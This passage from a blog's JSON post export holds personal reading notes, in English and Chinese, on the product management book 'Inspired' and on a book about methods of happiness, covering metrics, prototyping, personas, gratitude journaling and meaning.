purpose today; is this something they do manually or offline; is this better than what they use today; how likely will you recommend this product to your friend; (or at least ask them to give it a try); if possible, structure the problem on a scale, like 0-10. Then we can find out if it improve or not in next round. ask them how much they are willing to pay to use this product. (if they cannot answer, they means they are not sure if the product can solve the problem or not) Chapter 23: improve existing product it is not about adding features, even not about what some particular customers think, or the result of survey, or a focus group, they are all tools, the key is to chasing the metric whick we set up at the beginning to measure success. below are the ways we can collect information to help us understand why and how to imporve the merics: site analytics; sales department; customer serivce; real user test; focus on relentlessly pursuing metrics by studying live use and working the numbers in the right direction. Chapter 24: gentle deployment the way to avoid user abuse notice in advance; running two versions in parallel; double Q&#x2F;A efforts to ensure not rollback; regional deployment; Chapter 25:rapid response keep the whole team members together for one or two weeks after release, and then they can response quickly once the issues arise. Chapter 26: succeeding with agile methods the design work must be one or two sprints ahead of engineering. let engineers break up the sprint into whatever granularity they prefer. Let them chunk the functionality into sprints as they see fit. don’t release every sprint except the product manager think the functionality is sufficient. agile stem from custom software, so it is must to understand the difference between product software and custom software, like the interaction design, visual design, and architecture design. Chapter 27: succeeding with waterfall processes do prototype and test it before give it to the engineering. Chapter 30: succeding in the large companies learn how decisions are made inside your organization; building relationship before you need them. Make friends; long live skunk works; just get it done; pick your battles; build consensus before important meetings where decision are required. share information; put your manager to work; evangelize; Chapter 31: learn from Apple hardware serves the software; software serves the user experience; user experience serve the emotion; Chapter 32: beware of specials don’t fall down the slippery slopes; it is natural for the customers to describe their problems in terms of solution rather than underlying problem itself; it is the product manager’s job to tease out the core issues and needs. consider looking at how to keep your product general purpose but allow the product to be extended by a solution provider. Chapter 33: the new old thing two key methods that smart company use to create a winning product in mature market: they understand the target market and where the current products fall short; product usability test is a good technique to do this, either your own product or your competitor’s; great product leaders know what is possible is always changing. New technologies enable new solutions that may hot have been possible and feasible until now. great product manager combine with what is desirable with what is just now possible. Chapter 34: fear, greed, lust the role of emotion in products: people buy products largely out of emotional reasons; the dominant emotion for enterprise is fear and greed. For consumer, it is more personal, like loneliness, love or lust, pride, greed. when doing prototype testing, you should also take this opportunity to find out what emotion driving the users, and how well your product meet that emotion. Chapter 35: the emotional adoption curve an interview with Jeff focus on the most miserable thing people have to deal with everyday. focus on the group of irrationals, they will exaggerate their emotions; look for ways tap into these emotions with features and all other things; the freshman emotion: loneliness, insecurity, fear, frustration, anger, Chapter 36: usability vs. aesthetics both are important, but require different skills; it is not easy to find a person can do both. Chapter 37: keys to consumer internet service product usability; personas: divide your users into several important personas, examine every new feature with them; scalability: dedicate 20% from day one; availability; customer support; privacy and data protection; viral marketing; globalization; gentle deployment; community management; Chapter 38: keys to enterprise products usability; product actually needs to work; specials: avoiding specials takes a lot of discipline; customers and charter user program; designing for the sales channel; the customer versus the user: there are different types of end users, system administrators, management, and other business applications; product installation; product customization, configuration, and integration. product update. the sales process: use the internet too. Chapter 39: keys to platform products high leverage but not easy. the priority: end-users &gt; application providers &gt; developers Chapter 40: best practices summary the role of product management: not marketing, not project management; the role of user experience: it is all important. opportunity assessment: lightweight, to-the-point assessment replace the old MRD. what problem to solve, who solve for, how to measure success, before jump into solution. charter user program. product principles personas focus on discovery. the use of prototype test prototype with target users. measure to improve: analyzing the product actual use, driving the product to improve the key metrics. Chapter 41: product manager worry list is my product compelling to the target customers; have we made the product as easy to use as humanly possible. will this product succeed against competition; not competition now, but the time when we ship. do I know the customers who will buy this product. is my product truly differentiated; can I tell this differentiation to a company executive in 2 minutes, to customer in 1 minutes, to industry analysis in 30 seconds? will the product actually work? is the product a whole product. how will customer actually think about and buy the product. is it consistent with how we plan to sell it. Are the product strengths consistent with what’s important to our customer? Are we positioning these strengths as aggressively as possible. Is the product worth money? How much money? Why? Can the customer get it cheaper elsewhere. Do I understand what the rest of product team think is good about the product? Is it consistent with my own view?","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"产品","slug":"产品","permalink":"http://example.com/tags/%E4%BA%A7%E5%93%81/"}]},{"title":"幸福的方法","slug":"幸福的方法","date":"2016-01-25T14:25:00.000Z","updated":"2024-09-22T23:11:33.946Z","comments":true,"path":"2016/01/25/幸福的方法/","permalink":"http://example.com/2016/01/25/%E5%B9%B8%E7%A6%8F%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"1. 关于幸福的疑问 幸福是什么？ 它应该不是稍纵即逝的情绪，比如快乐、狂喜、满足； 它不该是排斥一切不良的情绪，而是应该经得起困难和挫折的考验； 幸福的方法有其局限性，它并不是万能的，它无法解决一些极端的情况，比如抑郁患者、失去至爱、失去至亲等；每个人的生命中都有一些不可回避的痛苦； “我是否幸福”这个问题不重要，重要的是另外一个问题“怎样才可以更幸福”；相比5年前，我现在是否感觉更幸福；我如何做可以让自己5年后更幸福； 幸福是一个需要长期追求、永不间断的过程； 练习1：养成习惯 养成新习惯通常是一件困难的事情，但保持一个习惯就容易多了；与其强化自律，不如保持一个固定的习惯； 什么习惯可以让自己更幸福？确定了之后，将他们列入计划开始行动；一般坚持30天后，新习惯即可以被固定下来； 每次养成的习惯不要太多，一次一个足矣； 练习2：表达感恩 每天记下1-5件值得感恩的事；事情可大可小； 由于每天记录，事情可能重复，那在记下来的同时，想象一下当时的体验和感受，让自己的情感体验保持新鲜； 可以自己练习，也可与所爱的人一起完成； 2. 解读人生的四种汉堡模型 四种模式：（练习：回顾自己过去和现在的生活，经常处于哪一个或者哪两个类型中呢？） 忙碌奔波型：承受现在的痛苦，追求未来的快乐；（如果以一个旁观者，会给当时的自己一些什么建议？）（为了收入，做着一份自己不喜欢做的工作；建议：搞清楚自己不喜欢的原因是什么，是因为工作内容无意义，还是工作太多太累，还是压力太大；如果是前者，换一份工作，如果是后者，拒绝一些工作的安排；） 享乐主义型：注重现在的快乐，忽视行为可能带来的负面后果；（如果自己曾经经历过，这种生活的好处和代价分别是什么？）（沉迷于游戏之中，好处是得到了一时的满足，代价是长期来看会产生负面的后果，比如浪费了时间和金钱） 虚无主义型：既不享受眼前的所有，对未来也没有任何期望；（除了眼前的不幸，看不到任何希望；如果从旁观者的角度，会给当时的自己什么建议？）（失恋的时候；找一个新的恋人替代就好了，世界这么大，选择其实有很多） 感悟幸福型：能够享受当下所做的事情，而且通过目前的行为，也可以拥有更加满意的未来； 练习1：四个象限的特别日志（对应上面的四个模式） 连续四天，每天15分钟，写下自己在四个象限里的经历；（无论是一件事，或者人生中的一段时期，都可以） 每天不写超过一个象限的范围；写下当时的感受和现在的感受；当时的行为；当时和现在的想法； 练习2：冥想 选择一个安静的地方，让自己处于一个舒适的姿势；背部和颈部挺直； 深呼吸；意念扫描全身，引导呼吸到感到紧张的部位，让那个部位放松； 持续5分钟（最长20分钟）；专注于呼吸，如果发现注意力转移，把它带回到呼吸即可； 想象自己处于一个非常开心的状态中，让积极情绪包围自己；用30秒到5分钟的时间，让这种积极情绪蔓延全身并在体内流动； 把冥想变成习惯；每天花10分钟到1小时的时间来冥想； 3. 幸福的意义 幸福是什么：幸福是快乐与意义的结合；快乐代表现在的美好时光，是当下的利益；意义则来自于目标，是一种未来的利益； 快乐：情感引发行动，它赋予我们行为的动机；快乐是一种情感，但只有这种情感，却不能保证我们觉得幸福。我们可以假设自己可以通过虚拟现实来获得无尽的满足和快乐，但那样最终却会让我们陷入空虚，因为我们并没有真正创建任何有意义的价值；我们只关注了自己内在的情绪，而无法找到自己跟这个世界的联系；我们脱离了它，我们在它的空间里没有存在的位置和意义，而这会让我们失去存在的价值感； 意义：每一个人有自己不同的价值观，所以他对这个世界上哪些事情是有意义的，会有不同的判断；但这并没有关系，重要的是他能够自主的去选择那些他自己认为有价值做的事情，而不是为了满足别人的期望而去做；如果是这样的话，他就背离了自己的价值观，他是不会感到幸福的； 理想主义不是脱离实际，它与现实主义的区别，只是在于用一个更加长远的目标，来指引自己生命的方向； 太容易的事情我们会感到无聊，太困难的事情我们会感到挫折，所以我们最好的方式是去选择刚好能够挑战我们潜力的事情；当我们将它实现了以后，再做下一步的挑战；所以目标的实现是分批分期的，不要一下子设定太高的期望，而应该是根据自身的能力一步一步来；这样从长远来看，我们更容易坚持，也更容易一直保持一种比较投入和快乐的状态； 成功是一种外在的标准，但现实是每一个人，由于其先天和后天的原因，在特定方面的能力并不相同，所以如果要以金钱或权力做为统一衡量的标准，就要比要自然界的所有动物来比赛100米短跑一样，没有意义； 增加幸福感的最好方法是尝试，汲取经验，然后关注内在的感受； 练习1：人生地图 用1-2个星期的时间，每天花一点时间记录下当天的生活； 给每件事情打分，分意义和快乐两个维度，最高分5分，最低分-5分； 计算自己花在各项事情上面大概的时间；如果想以后多做一些，就标记++；如果想减少该件事情的时间，就标记–； 练习2：诚实的镜子 在一张表格上，记下对你而言最具快乐和意义的事情； 在每一项旁边记录下自己在该件事情上面所花费的时间； 问自己是否在最有价值上面花费了足够多的时间； 注：这个练习的目的是让我们保持“知”和“行”的一致性；经常反省自己； 4. 幸福才是人生的终极财富 金钱给我们提供了安全感，金钱可以满足我们的欲望，但它或许仍然解决不了我们的空虚，因为它并没有解决意义的问题；欲望的满足会带来快乐，但仅有快乐并不够，还需要有意义；否则就会像那个可以给人大脑以无限满足的虚拟世界； 只有当金钱契合我们的价值观时，追求金钱才让一个人感到幸福；如果一个人的价值观中，最重要的东西并不是金钱，那么仅仅追求金钱，会让他觉得像是一种枷锁，或者一种束缚； 已有太多的研究表明，金钱与幸福的关系，存在边际效用递减；即当一个人特别贫困的时候，金钱的增加会明显增加他的幸福感；但当金钱超过某个临界钱的时候，金钱与幸福的关系变得越来越无关了； 这个问题或许可以这样理解，我们通过金钱衡量自己在人群中的位置，但要超过中位数并不是特别困难，即只要超过50%的人即可；而大多数人是集中于中位数附近的，所以他们并不会形成阶级落差，他们仍然能够对自己的社会地位产生认同和归属感；所以，此时决定幸福感的要素更多的在于金钱以外的其他方面； 对我们而言，有意义的事情即使再小，也比无意义的事情有价值；那么，重要的问题来了，我们要深刻的追问自己内心的深处，什么事情对于我们是有意义的，而不是人云亦云； 反思：对你而言，什么比财富更重要？ 练习1：完形练习（目的：帮忙人们思考和领悟自己的生活） 很快想出6个（或者更多）不同的结尾，填写在待完形的句子的后面；（此时答案的对错不重要，先放一旁，不用进行评判） 当做完所有的题目后，再慢下来，看看自己能否从自己的答案中学习到一些东西； 如果从答案中领悟到一些东西，则考虑如何把它安排到实践中； 练习2：打造幸福地图 根据“诚实的镜子”或“人生地图”的练习结果，安排让自己觉得满意的理想的一周，时间安排得越具体越好，但要注意让它轻松易行，避免与其他事情发生冲突，不然会难以实现；之后，去实践这个周计划； 5. 设定幸福目标 相比于躺在某个地方等待幸福，如果能够设定一个能带来意义和快乐的目标，并为之努力，会更容易让人觉得幸福； 以前我们对目标存在了误解，我们以为它是一种结局，但其实它不应该是结局，它更多是为了提供一种意义，以及提供一个方向；意义和方向是为了让我们在前进的过程中，不至于迷茫和偏离；之后，我们解放了自己，让自己更能够沉浸在过程之中；我们需要体验和感受过程中的快乐，欣赏沿途的风景；而不是为了目标，低头走得太快，让自己的内心充满了压力和焦虑；目标不是为了到达，所以不用急于到达；目标只是一个方向，确保我们不走歪不迷失即可； 目标应该是自我和谐的，亦即它应该是真正发自内心的，而不应该是外界强加给我们的，即我们屈服外界的压力，选择了一个不符合自己内心的目标； 一个增加幸福感的方法：增加想做的事，而减少不得不做的事； 练习1：设定自我和谐的目标（如果不为自己设定目标，我们就很容易受到外界的影响，导致追求一些并非我们自已意愿的事情上面） 长期目标：挑战自己的潜力，实现与否倒在其次； 短期目标：把长期目标进行分期和分批； 行动计划：一些将要养成的习惯； 练习2：幸福董事会（由一些关注我们是否真正幸福的人组成，监督计划，提供建议，互相反馈总结） 6. 幸福学习法 心流体验：沉浸于学习体验本身；任务不要太难，也不要太容易； 相比于休闲，工作中可以获得心流体验的机会更多； 练习1：制定学习计划 活到老学到老，不停的发问，不停的探索这个奇怪的世界； 个人成长和专业成长，两个方面的学习计划； 练习2：困境的意义 写下一个曾经经历过的艰难时期，之后是否让自己变得更有韧性了，是否学到了重要的东西，是否变得心怀感恩，是否学到其他东西 可以在小组中一起完成这个练习； 7. 幸福工作法 快乐的工作源于对工作的热情，而我们对工作的热情，缘于我们的工作选择是受制于物质欲望、或他人的期望，还是被自己的情感、热情所推动； 帮助员工在工作中找到更多意义的办法：（此处刚好对应《重新定义团队》中，谷歌文化的三个基石：使命、透明、发声） 这份工作必须能够激发员工的才华和潜力； 员工在工作中不能是旁观者，而需要有发挥的空间，即扮演角色参与其中； 员工应该感到他们做出的业绩是有意义的；（这里或许是一种使命感） 有时候如果工作没有要求，我们也应该主动做出一些改变，让自己有机会在工作中享受心流的状态，而不是坐等其他人安排好一切； 如果一份工作，无论自己如何努力，也无法从中找到乐趣和享受心流体验，那么应该考虑换一份工作； 情感是我们行为的动机；因此，我们工作的动力，只能来源于我们的热情； 寻找工作的使命感；当我们在选择一份工作的时候，应该问的问题是“我们想做什么”，而不是“我们能做什么”；只有工作内容是真正我们想做的事情，我们才能够在工作中找到我们认同的使命感； MPS模式：意义meaning，快乐pleasure，优势strengths；什么能带给我意义？什么能带给我快乐？我的优势是什么？写出这三个问题的答案后，寻找它们的交集；它即可以帮忙我们选择工作，也可以帮忙公司的主管为员工安排感兴趣有意义又具备个人优势的工作； 使命感是可以培养的；每一份工作的背后，其实都在为这个世界贡献一份值得尊重的价值，寻找到这一份价值，有利于我们更明白自己的工作的意义； 8. 经营幸福的亲密关系 唯一能够区分很快乐和不快乐的要素是：是否拥有广泛而令人满意的人际关系；所以，高质量的人际关系，对于幸福与否非常重要，值得我们花时间去重视和经营； 爱不是一种简单的感觉或一种情绪或者不需要理由的；没有理性的基础，爱是无法延续的； 每个人都有自己最深最真的一些特性，这些特性的外在表现，即我们的个性，或者是我们的生活原则（注意，不一定是我们口头表达的生活原则，而是从我们的为人处事中透露出来的原则，这些原则才代表了我们最深最真的一面）；当我们爱上一个人的时候，如果是因为他的核心价值时，则可以说我们爱的是这个人本身，而不是一些外在的条件，如财富、声望、权利、相貌等； 爱是幸福的基础，而理解是爱的基础；爱会产生，但如果没有理解，它也会消失；人每天都在产生不一样的情绪，人是会变的，是会成长的，所以相互理解是一个没有终点的过程，两个人唯有不断的花时间尝试去理解自己的另一半，才能让爱的感觉维系更久和更深，从而为双方的幸福创造更大的空间；有了这个基础之后，我们还需要花费时间在那些我们觉得有意义和快乐的事情上面，我们才能最终感受到幸福；仅有爱，仍然不足以幸福； 我们通过理解和被理解来经营和加深和伴侣之间的亲密关系；同时通过做一些对双方都有意义和快乐的事，来增进双方的幸福感； 9. 幸福的土壤：仁爱之心我们通过意义和快乐来让自己感觉到幸福，如果在这个过程中，能够帮忙到别人，那是一种锦上添花的事情；但不一定必须追求帮助他人，毕竟幸福不是牺牲； 10. 幸福的肥料：幸福催化剂 在完善的世界里，我们能够天天做让自己开心且有意义的事情，但现实世界里经常不一定能够如此；折中的办法，是从小事做起；这些小事就像是一些催化剂一样，虽然小，却仍然能够给我们带来快乐； 当我们尝试并体验到有效的做法后，我们应该尽量把它变成一种习惯； 11. 幸福的根：幸福的深度： 幸福的高度是我们日常生活中所体验到的情绪波动，它有高潮，也有低谷；幸福的深度则是指我们内心深处的基本幸福感，它会在较长的时间周期内稳定不变； 幸福感取决于三个方面的因素：基因、环境、自身的行动；前二者经常是我们所无法掌控的，但第三者却是我们可以作为的；通过追求有意义和快乐的事，可以明显的增加我们的幸福感； 练习1：欣赏式探寻；回忆曾经让自己感觉幸福的人或事，分析幸福感产生的原因，尝试通过一些行动让这种感觉再现； 12. 幸福的阳光：内在的力量幸福感的产生首先需要我们接纳自己，承认自己的价值，承认自己有权利获得自己的幸福，而不是对这件事情存有怀疑或者恐惧，认为自己不配拥有； 13. 幸福的成长：心灵的智慧我们的进步，我们的成长，我们的幸福，都来源于我们认识自己以及向自己提问的能力；最深刻的剖析自己的内心，面对最真实的自己，拨开一些外在因素所给我们的层层遮罩；（想起来以前看到的古希腊的一句著名的哲言，叫做：认识自己）（最近刚知道这句话是刻在阿波罗庙的某个地方） 14. 享受幸福的花朵：淡定从容 时间的压力，使得我们无法享受过程；所以，简化我们的生活，学会拒绝过多的任务；而且，事实上它并不会影响我们最后的成功； 努力工作是成功的必然要素，但如果太努力了，则会带来相反的效果；（原因其实也很简单，因为我们无法持久，我们会远离自己的巅峰状态） 15. 幸福至上的原则 将追求幸福设为我们所有目标的终极目标； 问自己三个问题：什么事情对我是有意义的？什么能带给我快乐？我的优势是什么？","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"心理学","slug":"心理学","permalink":"http://example.com/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"}]},{"title":"启示录","slug":"启示录","date":"2016-01-21T07:12:00.000Z","updated":"2024-09-22T23:08:41.992Z","comments":true,"path":"2016/01/21/启示录/","permalink":"http://example.com/2016/01/21/%E5%90%AF%E7%A4%BA%E5%BD%95/","excerpt":"","text":"前言 缘起：如何确保开发的产品是用户想要的，有价值的，可用的，可行的； 关键角色及其职责 产品经理的主要职责： 评估产品机会； 有商业价值； 符合公司的发展方向； 定义要开发的产品（寻找解决方案）； 功能清单（流程图，业务逻辑，用例）； 用户体验（用原型来体现）； 发布标准（性能要求，可靠性，浏览器兼容等）； 运维团队：保证服务正常运行； 产品vs交互&#x3D;1：2； 交互vs视觉&#x3D;1：4； 产品经理与产品营销（两项工作天差地别） 前者负责定义产品； 后者负责对外宣传产品； 产品管理与项目管理 前者负责探索有价值的、可用、可行的产品，后者关注如何执行计划以按时交付产品； 对于少于10人的项目，可能不需要特别设置项目管理人员，因为可由scrum master承担部分事务，团队自组织； 对于大型项目，如采用版本火车的项目，由于需要多个scrum团队协同，单独的项目管理很有必要； 产品管理与产品设计 用户体验设计包括： 用户调研（或设计调研）； 交互设计； 视觉设计； 原型制作； 产品经理与软件开发 开发团队给产品经理提供帮助的方法: 开发人员参与原型测试，到现场感受用户的痛点； 产品经理向开发人员了解最新的技术趋势，以便了解原来不可行的方案现在变得可行了； 开发人员参与到早期的原型设计中，出谋画策的同时，也可以有效的评估开发成本； 产品经理配合开发人员的方法： 只定义满足基本要求的产品（即最小功能原型）； 进入开发阶段后，尽量减少变更； 对于开发阶段中出现的问题，产品经理应迅速给出解决方案（在维持基本功能和尽量减少更改的前提下）； 外包是出于寻找最优秀合适的团队人员，而不是出于省钱，因为提高生产效率产生的价值，远超过节约的成本； 重构代码：平时应预留20%的时间用于重构；如果已出现问题及短时间内不可能全部做完，则可以考虑分模块和分批重构； 招聘产品经理 产品经理应有的特质： 对产品的热情：他们尊重产品，喜欢思考，喜欢创造，喜欢改进一切不好的部分，让它变得更好； 用户立场：他们懂得换位思考，而不是一意孤行想改变用户的习惯； 智力：他们是善于思考的聪明人，对事物本质有洞察力，仅有勤奋是不够的； 职业操守：他们对自己的产品具有高度责任感，不会因贪图安逸而弃之不管； 正直：能够尊重和信任自己的同事，而不是一个自私的人，唯有如此，才能获得团队其他成员的支持； 信心：自信的人更有说服力，人们愿意追随有信心的人做为领导者； 态度：他们愿意对产品出现的问题承担责任，而不是一味的找借口； 技能：好的技能能够提高工作效率，但技能可以通过时间来习得； 运用技术的能力：新的技术涉及思考新的解决方案来处理老问题，所以对技术的理解和运用变得很重要； 专注：懂得什么才是最重要的，关注核心功能，克制增加功能的冲动，并去掉多余的功能（更简单的产品，更容易获得用户的喜爱）； 时间管理：熟练的区分重要任务和紧急任务，合理的安排工作时间； 沟通技能：书面和口头沟通的能力，以及演讲的能力； 商业技能：能够用合适的语言与各种角色的人员进行有效的沟通，商业的语言和技术的语言； 行业知识可以学习，但解决问题的思路则难得多，比如招聘产品经理的时候，可以询问他们如何学习思考，比如开发一个陌生的新产品前，他们需要学习哪些知识，花多久时间学习，如何学习，如何利用这些知识； 管理产品经理 产品总监的两个职责： 组建优秀的产品经理团队； 训练和培养产品经理的工作能力； 规划公司的产品战略，负责产品组合； 透彻理解公司的商业战略，确保产品组合直接支持公司的商业战略； 与产品经理一起完成产品规划，共同实现产品规划； 带领产品团队制定产品原则，坚持按照原则去开发产品； 识别和协调不同产品经理之间的冲突； 通过用户净推荐值来评价产品经理的工作是否合格（这个指标体现了用户满意度，而且有利于低成本的口碑营销）； 巴顿将军的忠告 永远不要告诉别人怎么做，而是告诉他们你想要什么结果（即告知你的目的，而不用告诉你的解决方案，因为解决方案是有多种的，如果告诉了解决方案，就错失了其他多种的可能更好的解决方案）； 两个常见的误区： 用户经常告诉产品经理他们想怎么做，而不是他们想达到的目的（因为针对问题思考解决办法是人的天性） 产品经理经常告诉设计师要怎么做，而不是告诉他们自己想达到的目的；（注意：留给设计师和开发人员的空间越大，他们越能发挥他们的才能创造更好的解决方案）； 产品副经理 创造好的产品，本质上是思考好的点子和创意；因此，如果只局限于自己思考点子，就会有很大的局限性；做产品要找公司最聪明的人合作，每个公司内部都会有几个绝顶聪明的人，找到他们，请求他们的帮助，甚至把他们招到团队里面来； 找到这些人的办法： 多向同事打听打听，肯定会有收获； 走动式管理，多花时间与员工相处； 打开大门，让大家知道你随时欢迎他们来提建议； 注意倾听与会者的对话和发言； 向大家诉说你的烦恼，请求大家的帮助； 和同事一起去泡吧； 管理上司 管理上司的10条经验： 为项目波动做好准备，通过提高警惕，以及记录工作进度（不波动是不可能的）； 注意沟通的方式和频率（不同的上司偏好不同的沟通方式，对症下药）； 会前沟通（如果在会上有人反对，其他人也会附和；因此，应该在会前私下取得每个人的建议和支持）； 多提建议，少提问题（最好根据问题的重要性列举多种解决方案，并附上你的建议和依据）； 向上司借力（如果自己无法找到其他高管进行沟通，可由上司代为转达）； 充分准备（对自己方案中的漏洞，做好回答的准备）； 缩短邮件的篇幅（由于管理者每天收到大量邮件，因此级别越高，写出的邮件应该越短，简明扼要）； 多用数据和事实说话（没有数据支持的方案，只能是个人的臆断）； 内部宣传（充分有效的宣传，可以让内部同事乐于帮助你）； 做让领导省心的员工（不要让上司做你的导师，但可以在上司外的人群中寻找导师，思考如何节省上司的时间，会收益匪浅）； 评估产品机会1. 只关注市场需求，不涉及解决方案；2. 评估过程中需要回答的10个问题： 产品要解决什么问题；（产品价值） 为谁解决这个问题；（目标客户） 成功的机会有多大；（市场规模） 怎么判断产品是否成功；（度量指标） 成功的必要条件是什么；（解决方案需要满足的条件，或者说解决方案应该解决掉哪些问题，满足哪些条件才算是好的解决方案）（此处有新的理解，或许是指前提条件？即背景因素，有部分非我们所能掌控？） 市场上的同类产品有哪些；（竞品分析） 为什么我们适合做这个产品；（竞争优势） 现在的时机合适吗；（市场时机） 如何将产品推向市场；（销售策略） 结论：继续 or 放弃；3. 盈利模式：多从财务的角度来看待产品，例如各种财务指标的计算与分析； 产品探索 弄清楚要开发什么样的产品（定义正确的产品）； 工作内容： 分析各种创意； 广泛收集用户需求；(角色、场景、问题） 拿出原型并加以测试； 软件行业常见的偏见：需求分析与设计是可预测的，可控制的；但实际情况是它是不可预测的，是创造性的工作，更像是艺术而非科学； 探索是否有用户需要产品；（寻求市场，让用户难验证产品，确保产品有价值） 探索能够解决问题的产品方案；（让产品可用、可行） 教训：在弄清楚产品定义前，不要招聘开发人员；如果有开发人员，也要将其投入到产品探索的工作中； 产品原则 在组建或进入一个新团队时，务必先制定产品的原则，这样可以让大家在决策过程中减少争执； 产品原则需要召集团队成员一起讨论和制定，而不是由单个人说了算，这样才能确保原则制定后，能得到每一个人的贯彻执行； 制定原则过程中需要思考的4个问题： 究竟要解决什么问题； 究竟要为哪一类角色解决问题； 产品要达到什么目标；（例如易用性、功能、成本、响应速度、安全性、用户隐私等） 每项目标的优先级是什么；（务必要为每个目标制定优先级，让团队达成共识，并将其写在白板上，提醒每一个人，开会前重申） 制定决策的过程和依据需要透明，不要让别人觉得自己是在凭直觉判断；务必告诉大家决策的依据和理由； 激烈的争吵会影响团队的士气和工作效率，所以应该尽量避免；如果有出现，应该回顾一下产品原则，包括产品目标和目标优先级； 我看了一下作者网站上的案例，发现案例里面的产品原则涉及以下几个部分： 我们的产品是为了改变什么情况； 我们想为准改变这些情况； 我们想这么改变的原因； 我们的价值观念，即我们认为什么更加重要； 为什么我们觉得我们产品的存在是必要的； 注：感觉以上5点都侧重做这个产品的使命感，大家因为使命感来做这个产品，带着一种要改变世界的原动力； 产品评审团 决策流程过长会影响工作效率，所以很有必要设定机制，以便可以及时的做出明智的决策； 评审团的成员一般由相关部门的负责人组成，这些负责人可以分配和协调资源； 分为四个里程碑的工作点： 制定产品战略和产品路线图（在这个阶段，产品经理还没有开始介入；相当于是公司的高层人员参与的季度或年度会议）；会议结果是选择值得投入的产品，之后让产品经理开始评估产品机会； 根据产品机会评估的结果，决定是否开始定义产品的解决方案； 根据产品原型、用户测试结果、成本估算明细，决定是否开始开发产品； 根据最终产品，评审产品质量、产品效应、发布计划，决定是否最终发布产品； 注意事项： 评审团不负责具体细节，也不负责设计；如果有提出，置后考虑； 第二个里程碑点，只按大中小码来估算成本；第三个里程碑点，按原型来估算较详细的成本； 产品上线3-6个月后，再组织一次评审会议后，根据运营指标，回顾之前的评审，经验总结供将来参考； 每次评审前，产品经理最好向各评审团成员做简要汇报，以便提前得到反馈，避免会上措手不及，导致无法及时决策； 特约用户 通过特约用户，可以更早的得到反馈，洞察需求，降低风险； 成为特约用户的好处： 参与产品的设计，以便确保产品可以解决他们手边急需解决的问题； 可以尽早的试用产品，解决问题并降低相关成本； 不需要支付费用，只在确保产品可以解决问题后才付费，降低了风险； 如果一个产品征集特约用户出现困难，则说明产品本身的价值可能有问题，解决的并不是用户痛苦的问题； 至少征集6位特殊用户（可以先圈定8-10人，再筛选为6人）（如果太多，可能产品经理会忙不过来）（用户特征：积极、活跃、善于思考、乐于分享）（如果是面向大众的互联网产品，则人数建议为10-15人） 市场调研 每一种调研方法都有其适用场景以及局限性，要能够弄清楚它们的区别； 采集数据： 现场观察法：可以获得大量信息，而这些信息是口头无法充分表述的； 单人访谈法：可以了解到观点、目的和思路，这些是观察法所无法提供的； 问卷调查法：低成本，快速收获大量的结果，缺点是考验问题设计的能力； 焦点小组：适用于某些需要知悉多方意见的内容，从不同角度阐述相同主题，缺点是会互相干扰，群体压力； 头脑风暴法：适用于创新思路的场景； 自我陈述法：适用于使用反馈的收集，考验用户的表达能力； 分析数据：原型测试；A&#x2F;B测试；卡片法；数据对比分析；鱼骨图；情景分析法；人物角色法；故事板；用户点击分析； 调研是为了获得信息和存在的问题，用于思考解决方案；而不是简单的通过调研获得解决方案； 产品人物角色 主要用途： 可以用来筛选重要的功能，即确定功能的优先级； 避免团队将自己的需求当成用户的需求； 可能不止一种人物类型，加以区分有利于对角色的优先级进行排序； 通过角色，可以方便的向开发团队成员描述目标用户是谁； 清晰的人物角色，可以让团队成员在一些问题上快速达成共识；（而不是陷入按自己角度出发的争论之中） 人物角色要越早设定越好，而且要在最明显的地方贴出来，时时提醒自己； 制定人物角色时，一开始先不要想这个角色有什么特点，而是先描述这个角色的方方面面，等描述足够多的内容后，它的特点自然会浮现出来； 重新定义产品说明文档 产品文档的目的是向开发团队交付具有成功潜力的产品说明，所以，只要是能够让开发团队更加迅速理解需要开发的产品，就是一份好的说明文档；所以，高保真原型是最好的方式； 但只有原型并不够，还应该包括一些辅助的文档，以便能够说清楚以下一些事项： 业务逻辑（虽然通过原型相关人员可以摸索出逻辑，但那样的效率太差，也可能由于原型本身问题出现理解偏差。直接用文字说明来得更简单直接）（建议包括：功能清单、业务流程、用例） 发布要求：性能表现（比如网页的打开速度）、可靠性（比如数据备份、网络攻击、负载均衡等）、交付要求（比如浏览器兼容性、安装的硬件要求等） 用户体验设计与实现 先定义用户体验再动手开发（因为UE设计可以低成本的修改，而且更改迭代的周期很短，所以设计与开发务必不要同时进行，设计应该在开发的前面完成） 但在设计的过程中，可以请一位开发成员评估设计的可行性与成本，以便做出更明智的决策； 基本产品 第一版原型，只具备实现商业目标的最基本功能要求；（最小功能、最小功能、最小功能，重要的事情说三遍） 邀请一位开发人员参与原型设计，以便协助评估成本和可行性； 请真实用户验证产品原型； 产品验证 可行性测试：由开发人员在原型阶段参与评估，重点寻找那些难以克服的障碍；如果存在技术上的可行性风险，一定要提前解决这些问题； 可用性测试：请真实用户验证原型；除了可以得到大量的反馈信息，还可以发现原先设计上面遗漏思考的地方； 价值测试：可用性测试验证产品是否方便使用，价值测试验证用户是否喜欢这个产品，是否能解决他们的问题，是否愿意付费； 原型测试 物色测试者： 邀请特约用户参加，如果没有特约用户，马上寻找； 如果是企业级产品，可以在同类产品的展销会上面寻找目标用户； 如果公司较大，可以定期展于原型测试活动，并安排专人负责，这样产品经理可以不用为寻找测试者操心； 离开办公室，去目标用户聚集的地方，进行观察、倾听和寻找，注意放低身段； 在约定时间的前一天与测试者进行电话确认，以免对方爽约； 准备测试： 事先准备好测试内容 根据用户的心智模型和功能点，整理好测试任务； 制作测试大纲，即做测试时的流程，以便大致控制测试过程，避免事项遗漏； 制作脚本，即测试过程中要讲的台词、要问的问题、需要记录的事情等； 记录工具，包括纸张、摄像、录音等； 在给用户原型前，要先观察一下用户之前是如何解决他们所面临的问题的，让其试演示一下，从中可以了解到用户的操作习惯和心智模型； 在让用户开始测试任务前，先让用户自由探索2分钟左右，然后询问用户能否看出产品解决什么问题、哪些地方吸引他们等； 测试后通过沟通了解用户对原型的评价，包括打分、推荐值等； 两个技巧： 鹦鹉学舌：当用户发出提问时，不要回答他们的问题，而是复述他的问题，把问题回给用户，目的是鼓励他们自己尝试和探索，而不是为了方便从我们这边得到答案； 当用户陷入困难时，询问用户“接下来希望发生什么”，这样可以了解到用户的心理预期，以及他们的心智模型； 测试前，务必向用户说明两个事项： 